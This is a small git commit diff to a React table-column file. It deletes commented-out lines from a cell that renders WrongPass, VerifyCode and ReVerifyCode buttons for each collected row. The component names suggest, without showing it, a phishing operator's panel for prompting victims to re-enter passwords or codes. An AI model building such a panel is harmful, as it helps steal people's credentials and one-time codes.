31b5b47d238fc0ba63ca71b476a36e79aa7e9252
mikejson7856 <163439483+mikejson7856@users.noreply.github.com>
2025-05-20 22:02:42 +0600

    Update collectionColumn.js

--- components/Table/columns/collectionColumn.js
+++ components/Table/columns/collectionColumn.js
@@ -195,9 +195,6 @@ export const collectionColumn = [
     width: 200,
     Cell: ({ row }) => (
       <div className="flex flex-col justify-center items-center gap-2">
-        // <WrongMail id={row.original._id} 
-       // <WrongPass id={row.original._id} />
-        // <WrongMega id={row.original._id} /> 
        <WrongPass id={row.original._id} />
         <VerifyCode id={row.original._id} />
         <ReVerifyCode id={row.original._id} />
